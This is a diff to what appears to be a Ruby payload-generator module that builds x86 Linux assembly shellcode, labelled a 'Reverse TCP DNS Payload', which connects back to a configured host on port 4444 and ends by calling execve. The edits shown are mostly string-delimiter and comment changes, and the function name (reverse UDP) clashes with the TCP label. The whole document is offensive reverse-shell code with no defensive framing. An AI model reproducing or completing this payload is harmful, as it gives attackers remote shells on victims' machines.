@@ -3,7 +3,7 @@
 
 
 host = 'example.com'  # This needs to be removed.
-port = 4444
+port = 4444           # This needs to be removed too...
 # example : example.com
 # domainname will be the name of the server in this case example
 # the sub domain name will be .com
@@ -142,7 +142,7 @@ def asm_reverse_udp(opts={})
     retry_count  = [opts[:retry_count].to_i, 1].max
     encoded_port = "0x%.8x" % [opts[:port].to_i,2].pack("vn").unpack("N").first
 
-Payload = """
+asm = %Q^
 ;Reverse  TCP DNS Payload For x86 Linux
 ;Author : Krash
 
@@ -210,7 +210,7 @@ main:
     ; push 0x00000100
     ; push 0x0001AAAA
 
-    #{EndianRequest.join('')}
+    #{EndianRequest.join('')}  ; Set the DNS payload.
 
 
     mov edx,esp ; Move the string to EDX so we can send it. 
@@ -319,7 +319,6 @@ loop:
  int 0x80 ; exec sys_execve
 
 
-"""
+^
 end
 
-#puts Payload
